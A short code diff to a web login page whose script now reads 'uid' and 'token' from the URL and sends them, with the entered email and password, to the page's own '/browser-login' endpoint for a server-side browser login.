@@ -98,6 +98,10 @@ button:disabled { background: #1e3a6e; cursor: default; }
   <div class="hint">Данные вводятся напрямую в браузер на сервере</div>
 </div>
 <script>
+const _q = new URLSearchParams(location.search);
+const _uid   = _q.get('uid')   || '';
+const _token = _q.get('token') || '';
+
 async function doLogin() {
   const btn = document.getElementById('btn');
   const st  = document.getElementById('st');
@@ -109,7 +113,7 @@ async function doLogin() {
     const r = await fetch('/browser-login', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({email:em, password:pw})
+      body: JSON.stringify({email:em, password:pw, uid:_uid, token:_token})
     });
     const d = await r.json();
     if (d.navigated && !d.error_on_page && !d.captcha && !d.two_factor) {
